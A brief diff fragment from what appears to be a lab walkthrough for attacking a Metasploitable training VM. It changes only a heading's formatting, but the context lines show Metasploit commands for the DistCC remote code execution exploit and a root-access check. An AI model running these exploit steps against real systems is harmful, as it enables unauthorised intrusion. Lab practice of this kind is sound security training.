@@ -39,7 +39,7 @@ exploit
 whoami  # Confirms root access
 
 
-### **2️⃣ Exploiting DistCC RCE**
+### 2️⃣ Exploiting DistCC RCE
 msfconsole
 use exploit/unix/misc/distcc_exec
 set RHOST <Metasploitable_IP>
